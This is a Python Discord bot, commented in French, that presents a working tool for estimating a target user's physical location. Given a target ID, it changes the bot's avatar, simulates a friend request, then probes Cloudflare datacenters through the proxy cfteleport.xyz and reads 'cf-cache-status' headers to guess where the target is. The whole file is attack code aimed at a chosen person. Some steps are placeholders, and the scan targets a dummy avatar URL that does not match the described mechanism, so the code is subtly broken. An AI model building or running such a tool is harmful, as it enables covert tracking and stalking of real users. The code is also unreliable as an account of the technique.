#!/usr/bin/env python3
"""
DiscordGeoGuesserBot - Bot Discord pour démontrer l'attaque de géolocalisation via cache

Ce bot modifie son avatar, envoie une demande d’amitié (simulation)
à un utilisateur cible et scanne différents datacenters pour estimer
la localisation de la cible via l'analyse des en-têtes "cf-cache-status".
"""

import discord
from discord.ext import commands
import asyncio
import random
import requests
import os

# --- Fonctions Utilitaires ---

def get_random_avatar():
    """
    Charge une image aléatoire à partir du fichier "avatar_random.png".
    Cette image sera utilisée pour changer l'avatar du bot.
    
    :return: Contenu binaire de l'image ou None en cas d'erreur.
    """
    try:
        with open("avatar_random.png", "rb") as f:
            return f.read()
    except Exception as e:
        print(f"Erreur lors du chargement de l'avatar : {e}")
        return None

def send_friend_request(target_user_id):
    """
    Simule l'envoi d'une demande d’amitié via l'API Discord.
    (Cette fonction est un placeholder et doit être adaptée pour une intégration réelle.)
    
    :param target_user_id: Identifiant de l'utilisateur cible
    """
    print(f"Demande d’amitié envoyée (simulation) à l'utilisateur : {target_user_id}")

def scan_cache_for_avatar(avatar_url, datacenters):
    """
    Scanne l'URL de l'avatar à travers plusieurs datacenters pour récupérer l'état du cache.
    
    :param avatar_url: URL de l'avatar à scanner
    :param datacenters: Liste de codes de datacenters à interroger
    :return: Dictionnaire avec les résultats pour chaque datacenter
    """
    results = {}
    for colo in datacenters:
        proxy_url = f"https://cfteleport.xyz/?proxy={avatar_url}&colo={colo}"
        try:
            response = requests.get(proxy_url, timeout=5)
            results[colo] = response.headers.get("cf-cache-status", "Inconnu")
        except Exception as e:
            results[colo] = f"Erreur : {e}"
    return results

def calculate_location(datacenter_results):
    """
    Calcule une localisation approximative basée sur les résultats de cache.
    Ici, une simulation simple est utilisée : les datacenters ayant répondu "HIT"
    sont considérés comme indicateurs de la proximité.
    
    :param datacenter_results: Dictionnaire des résultats des datacenters
    :return: Chaîne de caractères décrivant la localisation estimée
    """
    hits = [colo for colo, status in datacenter_results.items() if status.upper() == "HIT"]
    if hits:
        return f"Localisation potentielle proche des datacenters : {', '.join(hits)}"
    else:
        return "Localisation indéterminée."

# --- Configuration du Bot ---

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot connecté en tant que {bot.user}")

@bot.command()
async def geoguesser(ctx, target_user_id: str):
    """
    Commande Discord pour lancer le processus GeoGuesser.
    Usage : !geoguesser <target_user_id>
    """
    await ctx.send("Démarrage du processus GeoGuesser...")
    
    # Étape 1 : Changer l'avatar du bot avec une image aléatoire
    new_avatar = get_random_avatar()
    if new_avatar:
        try:
            await bot.user.edit(avatar=new_avatar)
            await ctx.send("Avatar modifié avec succès.")
        except Exception as e:
            await ctx.send(f"Erreur lors du changement d'avatar : {e}")
    
    # Étape 2 : Envoyer une demande d’amitié (simulation)
    send_friend_request(target_user_id)
    await ctx.send("Demande d’amitié envoyée (simulation).")
    
    # Étape 3 : Attendre pour laisser le temps au téléchargement de l'avatar (notification push)
    await asyncio.sleep(10)
    
    # Étape 4 : Scanner l'URL de l'avatar sur différents datacenters
    # Pour la démonstration, on utilise une URL factice basée sur l'ID cible.
    avatar_url = f"https://cdn.discordapp.com/avatars/{target_user_id}/dummyhash.png"
    datacenters = ["SEA", "IAD", "EWR"]
    results = scan_cache_for_avatar(avatar_url, datacenters)
    await ctx.send(f"Résultats du scan de cache : {results}")
    
    # Étape 5 : Calculer et afficher la localisation estimée
    location = calculate_location(results)
    await ctx.send(f"Localisation estimée : {location}")

# --- Lancement du Bot ---
if __name__ == '__main__':
    # Le token doit être défini dans la variable d'environnement DISCORD_BOT_TOKEN
    token = os.getenv("DISCORD_BOT_TOKEN")
    if token:
        bot.run(token)
    else:
        print("Merci de définir la variable d'environnement DISCORD_BOT_TOKEN avec votre token de bot Discord.")
